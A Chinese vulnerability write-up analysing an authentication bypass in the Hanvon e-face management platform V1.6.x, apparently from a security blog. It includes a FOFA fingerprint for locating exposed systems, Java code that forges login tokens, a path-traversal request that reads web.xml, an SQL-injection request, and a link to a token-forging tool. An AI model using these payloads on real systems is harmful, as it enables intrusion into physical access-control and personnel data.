---
title: "汉王e脸通综合管理平台 权限绕过漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-auth-bypass.html
asset_dir: assets/汉王e脸通综合管理平台-权限绕过漏洞
---

# 汉王e脸通综合管理平台 权限绕过漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/2 08:36
- 1475浏览
- [0评论](#comment)
- 2小时阅读

深入探索

漏洞扫描器

技术文章订阅

网络安全会议

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其系统 UserHandlerInterceptor 接口权限校验设计不合理可[绕过系统鉴权](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)。

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"
>
> 漏洞扫描服务

# 漏洞分析

首先看 web.xml 中spring mvc过滤器部分

深入探索

漏洞预警服务

网络安全培训

Windows安全工具

```
<!-- 配置Spring MVC过滤器 -->
    <servlet>
        <servlet-name>spring-mvc</servlet-name>
        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
        <init-param>
            <param-name>contextConfigLocation</param-name>
            <param-value>classpath:spring/mvc-servlet.xml</param-value>
        </init-param>
        <load-on-startup>1</load-on-startup>
    </servlet>
    <servlet-mapping>
        <servlet-name>spring-mvc</servlet-name>
        <url-pattern>*.do</url-pattern>
    </servlet-mapping>
```

在传统 Spring MVC 项目中，`web.xml` 负责定义整个 Web 应用的“入口规则”，它通过 `<servlet>` 和 `<servlet-mapping>` 标签，将特定类型的请求（如以 `.do` 结尾的路径）交由 DispatcherServlet 处理。而 DispatcherServlet 的行为和功能，又完全取决于它加载的 Spring 配置文件（如 `mvc-servlet.xml`）。这种配置方式实现了“入口与实现解耦”，但也意味着如果配置链的某一环出现安全疏漏，可能导致整个 Web 层暴露风险。因此，理解 `web.xml` 与 Spring 配置文件之间的调用关系，是[漏洞分析](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)和防护的基础。

物流软件安全

跟进 `application-mvc.xml` ，其中拦截器定义如下

```
<!-- SpringMVC拦截器 -->
    <mvc:interceptors>
        <mvc:interceptor>
            <mvc:mapping path="/**"/>
            <bean class="com.hanvon.iface.web.filter.UserHandlerInterceptor"></bean>
        </mvc:interceptor>
    </mvc:interceptors>
```

深入探索

传输层安全性协议

编码转换工具

网络安全课程

跟进 `com.hanvon.iface.web.filter.UserHandlerInterceptor`

```
private SystemDsm systemDsm;
    private static final List<String> WHITE_LIST = new ArrayList();
    private static String URL_TOKEN_EXPIRE = "/login/tokenIsExpire.do";
    private static String URL_SYSTEM_NOTVALID = "/login/systemNotValid.do";
    private static String URL_REMAINING_DAYSOFPROBATION = "/login/getRemainingDaysOfProbation.do";
```

开头定义了一些常量,重点看 `preHandle` 方法

```
public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object o) throws Exception {
        RequestContext.setRequest(request);
        RequestContext.setResponse(response);
        HttpSession session = request.getSession();
        String uri = request.getRequestURI();
        if (!uri.endsWith("getRemainingDaysOfProbation.do") && !uri.endsWith("systemAuthorization.do") && TheApp.getServerLicense().equalsIgnoreCase("mac") && TheApp.getSystemState() != 99 && TheApp.getSystemState() == -1 && TheApp.getValidDays(AESencrp.decode(this.systemDsm.getSystemRoleById1(1L).getSslTime())) == -1) {
            response.sendRedirect(request.getContextPath() + URL_REMAINING_DAYSOFPROBATION);
            return false;
        } else {
            String languageLocal = request.getHeader("languageLocal");
            Locale newLocale = TheApp.getLocale(languageLocal);
            setLocale(request, response, newLocale);
            if (!this.isWhiteUri(uri)) {
                if (session.getAttribute("__sessional_user__") == null) {
                    String token = request.getParameter("globalToken");
                    if (!Utils.isEmpty(token)) {
                        String s = Utils.decrypt(token);
                        String[] arr = s.split(",");
                        if (arr.length == 6 && arr[2].matches("\\d+") && arr[3].matches("\\d+")) {
                            String ip = arr[1];
                            Long time = Long.parseLong(arr[2]) + 1483200000000L;
                            long curr = System.currentTimeMillis();
                            if (Math.abs(time - curr) < 1800000L) {
                                SessionalUser su = new SessionalUser();
                                su.setId(Long.parseLong(arr[3]));
                                su.setUserName(Utils.decrypt(arr[4]));
                                su.setRealName(Utils.decrypt(arr[5]));
                                TheApp.setCurrentUser(su);
                                session.setAttribute("__sessional_user__", su);
                            }
                        }
                    }

                    try {
                        String str = Utils.encrypt(Math.abs((new Random()).nextLong() % 1000L) + ",1");
                        String recoToken = request.getParameter("recoToken");
                        if (!Utils.isEmpty(recoToken)) {
                            String s = Utils.decrypt(recoToken);
                            String[] arr = s.split(",");
                            if (arr.length == 2 && arr[1].matches("\\d+")) {
                                Long recoServerId = Long.parseLong(arr[1]);
                                session.setAttribute("__sessional_reco_id__", recoServerId);
                                SessionalUser su = new SessionalUser();
                                su.setId(1L);
                                su.setUserName("admin");
                                su.setRealName("reco server login");
                                session.setAttribute("__sessional_user__", su);
                                TheApp.setCurrentUser(su);
                            }
                        }
                    } catch (Exception var16) {
                    }
                }

                if (session.getAttribute("__sessional_user__") == null) {
                    response.sendRedirect(request.getContextPath() + URL_TOKEN_EXPIRE + "?tokenMessage=" + -1);
                    return false;
                }
            }

            return true;
        }
    }
```

需要重点关注的点

软件

- `String uri = request.getRequestURI();` 这个用法是说了无数回不安全的，可以导致权限绕过
- **白名单检查**：`!isWhiteUri(uri)` 判断当前 URI 是否需要认证。
- **会话用户不存在时**：尝试用 `globalToken` 参数自动登录。
  - **Token 解析**：解密后拆分为 6 段，验证第 3、4 段为数字。
  - **时间校验**：Token 时间戳（加基准值 `1483200000000L`）与当前时间差小于 30 分钟（`1800000L` 毫秒）。
  - **用户创建**：用 Token 中的用户 ID、用户名（解密后）、真实姓名（解密后）创建 `SessionalUser` 对象。
  - **存储用户**：存入当前会话和 `TheApp` 的线程局部变量。
- **备用 Token 机制（recoToken）**

1. 生成随机字符串（可能用于混淆）。
2. 通过 `recoToken` 参数登录：
   1. 解密后拆分为 2 段，验证第 2 段为数字。
   2. 存储 `recoServerId` 到会话。
   3. 创建管理员用户（固定 ID=1，用户名 `"admin"`），存入会话和线程变量。

- **默认通过**：若用户存在或 URI 在白名单中，返回 `true` 继续后续流程。

**总结**

**核心逻辑**：

1. **系统状态拦截**：在特定许可证和异常状态下，重定向至试用期页面。
2. **用户认证**：
   1. 非白名单 URI 需验证会话用户。
   2. 支持 `globalToken`（用户 Token）和 `recoToken`（系统 Token）自动登录。
3. **中断条件**：
   1. 系统状态异常 → 重定向试用期页面。
   2. 用户未认证 → 重定向 Token 过期页面。

**关键部分**：

- 双 Token 机制兼顾普通用户和内部系统认证。
- 时间戳校验防止 Token 重用。
- 本地化支持通过请求头动态设置。

综上，那么就有两种绕过方式

文件大小转换

- `getRequestURI()` 结合白名单url进行目录穿越绕过
- 伪造 `globalToken` 或 `recoToken`

其中 `globalToken` 未加密组成部分类似 `xxx,ip,timestamp,userId,加密用户名,加密真实姓名`

> 123456,192.168.1.100,1750668304227,1,admin,admin

再看 `isWhiteUri` 方法，是判断请求uri是否包含白名单，如果是就返回true

```
private boolean isWhiteUri(String uri) {
        for(String whiteUrl : WHITE_LIST) {
            if (uri.contains(whiteUrl)) {
                return true;
            }
        }

        return false;
    }
```

`WHITE_LIST` 列表如下

漏洞扫描服务

```
static {
        WHITE_LIST.add("/systemLogMgr/getSystemInfo.do");
        WHITE_LIST.add("/login/systemNotValid.do");
        WHITE_LIST.add("/login/loginOn.do");
        WHITE_LIST.add("/login/validationLogin.do");
        WHITE_LIST.add("/login/getPwdQuestionByUserName.do");
        WHITE_LIST.add("/login/checkQuestionAnswer.do");
        WHITE_LIST.add("/login/resetPassword.do");
        WHITE_LIST.add("/login/tokenIsExpire.do");
        WHITE_LIST.add("/channel/recoServerLogin.do");
        WHITE_LIST.add("/channel/anaServerLogin.do");
        WHITE_LIST.add("/channel/queryCaptureStatistics.do");
        WHITE_LIST.add("/dgmCommand/finishRegister.do");
        WHITE_LIST.add("/visitorInformation/getPersonByCardId.do");
        WHITE_LIST.add("/personnel/reportPersonnel.do");
        WHITE_LIST.add("/talk/queryTalkRecord.do");
        WHITE_LIST.add("/dgmOpenRecord/uploadOpenRecord.do");
        WHITE_LIST.add("/sysAuthStr/queryUserInfoByEmployId.do");
        WHITE_LIST.add("/sysAuthStr/saveSysAuthStr.do");
        WHITE_LIST.add("/manage/mobiMeetingApp");
        WHITE_LIST.add("/openDoorLog/queryNets.do");
        WHITE_LIST.add("/manage/intercom/");
        WHITE_LIST.add("/manage/m/");
        WHITE_LIST.add("/manage/mobiVisit/");
        WHITE_LIST.add("/manage/mobiSetting/");
        WHITE_LIST.add("/manage/mobiLeave/");
        WHITE_LIST.add("/manage/mobiOverTime/");
        WHITE_LIST.add("/manage/mobiAttOmit/");
        WHITE_LIST.add("/manage/mobiBranchSummary/");
        WHITE_LIST.add("/manage/mobiWorkflow/");
        WHITE_LIST.add("/manage/mobiShift/");
        WHITE_LIST.add("/manage/mobiAttend");
        WHITE_LIST.add("/manage/sysPhoneAuthCode");
        WHITE_LIST.add("/login/loginOnByPhoneAuthCode.do");
        WHITE_LIST.add("/login/getRemainingDaysOfProbation.do");
        WHITE_LIST.add("/login/systemAuthorization.do");
        WHITE_LIST.add("/deviceAlarm/getDeviceAlarmMonitorSum.do");
        WHITE_LIST.add("/systemSetting/getSysInterfaceStyle.do");
    }
```

# 漏洞复现

## globalToken

手戳一个加解密demo来测试，导入 iface.common-1.0.jar 到lib目录后，直接调用即可

网络安全

```
import com.hanvon.iface.utils.Utils;

public class Test {
    public static void main(String[] args) {
        // 调用静态方法
        long curr = System.currentTimeMillis();
        long time_st = curr - 1483200000000L;
        String time_str = String.valueOf(time_st);
        String data = "123456,127.0.0.1," + time_str + ",1,admin,admin";
        String encode_data = Utils.encrypt(data);
        System.out.println("加密后的数据: " + encode_data);
        String decode_data = Utils.decrypt(encode_data);
        System.out.println("解密后的数据: " + decode_data);
    }
}
```

[![汉王e脸通综合管理平台 权限绕过漏洞](images/img-001-4c4ae4b9dd0a.webp)](https://image.mrxn.net/d28dd22c28b74a9ca815666c8b3f06f9.webp)

通过校验，成功读取到文件内容

漏洞扫描服务

## recoToken

同样如 `globalToken` 手戳一个加解密demo就可以了

> 123456,111111
>
> 8uC4nBHRqTf4jIWz579hE

[![汉王e脸通综合管理平台 权限绕过漏洞](images/img-002-2cf2b9e033ce.webp)](https://image.mrxn.net/b045ca5473b440009468540ccd7f1498.webp)

同样通过校验，成功读取到文件内容

## WHITE\_LIST

```
GET /manage/login/loginOn.do/..;/..;/resourceUpload/imgDownload.do?filePath=/manage/WEB-INF/web.xml HTTP/1.1
Host: hanvon.mrxn.net
```

同样通过校验，成功读取到文件内容

[![汉王e脸通综合管理平台 权限绕过漏洞](images/img-003-4931ed0bd916.webp)](https://image.mrxn.net/3fbd113296d146d58c84907050b10434.webp)

sql注入同样ok

编程

```
GET /manage/m/..;aa/doorInfo/queryDoorInfoList.do?page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(2920=2920,1)))),8357)) HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 权限绕过漏洞](images/img-004-40430795e9bb.webp)](https://image.mrxn.net/41968471272e4eb5981fe4fc2424f78e.webp)

## 工具下载

globalTokenTools-1.0-SNAPSHOT.jar 使用方法如下图所示

代码安全审计

[![汉王e脸通综合管理平台 权限绕过漏洞](images/img-005-59b128568314.webp)](https://image.mrxn.net/95067de2686e4df2b114addbfbe036a0.webp)

[点击下载](https://image.mrxn.net/6a97a4a86fd6478693e1f4f27ee9aaf7.jar)

**文件哈希**：25d1bb368c8c5e57c6f6641933fac939485c6dc78d2f74018a33903d50974c37

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#权限绕过](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.globalToken](#toc-5-1-)
- [5.2.recoToken](#toc-5-2-)
- [5.3.WHITE\_LIST](#toc-5-3-)
- [5.4.工具下载](#toc-5-4-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
